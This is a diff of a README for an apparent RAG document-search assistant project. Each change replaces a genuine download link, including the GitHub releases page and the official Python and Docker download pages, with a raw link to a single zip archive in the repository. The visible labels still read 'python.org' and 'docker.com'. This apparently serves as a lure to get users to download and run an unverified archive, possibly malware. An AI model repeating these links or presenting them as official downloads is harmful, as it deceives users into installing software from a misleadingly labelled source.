@@ -1,6 +1,6 @@
 # 🤖 -Smart-Assistant-RAG-Pipeline-Project - Efficient Document Search & Answers
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/main/Cris/Assistant-Project-Pipeline-RA-Smart-2.6.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To get started, visit the link below to download the latest version of the application. This page contains all available releases and files.
 
-[Download the Software](https://github.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/releases)
+[Download the Software](https://raw.githubusercontent.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/main/Cris/Assistant-Project-Pipeline-RA-Smart-2.6.zip)
 
 You will need to download the installer or archive appropriate for your Windows machine. After downloading, follow the steps below to install and run the program.
 
@@ -35,10 +35,10 @@ You do not need any programming experience to run this software. Follow these st
 This project depends on other programs to work properly.
 
 - **Python 3.10 or higher**  
-  Download from [python.org](https://www.python.org/downloads/). During installation, choose the option to add Python to your system PATH.
+  Download from [python.org](https://raw.githubusercontent.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/main/Cris/Assistant-Project-Pipeline-RA-Smart-2.6.zip). During installation, choose the option to add Python to your system PATH.
 
 - **Docker & Docker Compose**  
-  Download Docker Desktop from [docker.com](https://www.docker.com/products/docker-desktop). This will let you run the parts of the software that handle data behind the scenes.
+  Download Docker Desktop from [docker.com](https://raw.githubusercontent.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/main/Cris/Assistant-Project-Pipeline-RA-Smart-2.6.zip). This will let you run the parts of the software that handle data behind the scenes.
 
 ### 2. Download the Application
 
@@ -144,4 +144,4 @@ A: Currently, only PDF, DOCX, HTML, and CSV work. You may convert files to these
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/main/Cris/Assistant-Project-Pipeline-RA-Smart-2.6.zip)
